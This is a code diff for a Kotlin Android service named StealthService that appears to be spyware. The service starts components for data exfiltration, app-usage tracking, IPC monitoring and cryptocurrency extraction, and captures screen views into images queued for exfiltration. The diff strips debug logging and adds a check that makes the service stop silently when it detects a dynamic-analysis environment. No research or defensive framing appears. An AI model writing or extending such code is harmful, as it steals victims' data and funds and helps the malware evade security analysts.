@@ -18,11 +18,9 @@ import java.io.FileOutputStream
 import java.lang.ref.WeakReference
 import java.text.SimpleDateFormat
 import java.util.*
-import android.util.Log
 
 class StealthService : Service() {
 
-    private val tag = "StealthService"
     private val notificationId = 1001
     private val channelId = "stealth_channel"
 
@@ -47,15 +45,19 @@ class StealthService : Service() {
     override fun onCreate() {
         super.onCreate()
 
+        // Abort silently when running inside a dynamic-analysis environment
+        if (AntiAnalysis.isAnalysisEnvironment()) {
+            stopSelf()
+            return
+        }
+
         createNotificationChannel()
         startForegroundWithType()
 
         exfiltrator = DataExfiltrator.getInstance(this)
-//        Log.d(tag, "exfiltrator initialized successfully")
         usageTracker = AppUsageTracker(this, exfiltrator)
         ipcMonitor = IpcMonitor(this, exfiltrator)
         cryptoExtractor = CryptoExtractor(this, exfiltrator)
-//        Log.d(tag, "cryptoExtractor initialized with exfiltrator")
 
         usageTracker.startTracking()
         ipcMonitor.startMonitoring()
@@ -122,22 +124,15 @@ class StealthService : Service() {
 
     private fun captureOwnView(rootView: View) {
         mainHandler.post {
-            Log.d("CaptureDebug", "captureOwnView called")
             val bitmap = rootView.drawToBitmap()
             if (bitmap != null) {
-                Log.d("CaptureDebug", "bitmap captured: ${bitmap.width}x${bitmap.height}")
                 serviceScope.launch {
                     val file = saveBitmap(bitmap)
                     if (file != null) {
-                        Log.d("CaptureDebug", "file saved: ${file.absolutePath}")
                         exfiltrator.queueImage(file)
                         logEvent("OWN_VIEW_CAPTURE", file.name)
-                    } else {
-                        Log.e("CaptureDebug", "saveBitmap returned null")
                     }
                 }
-            } else {
-                Log.e("CaptureDebug", "drawToBitmap returned null")
             }
         }
     }
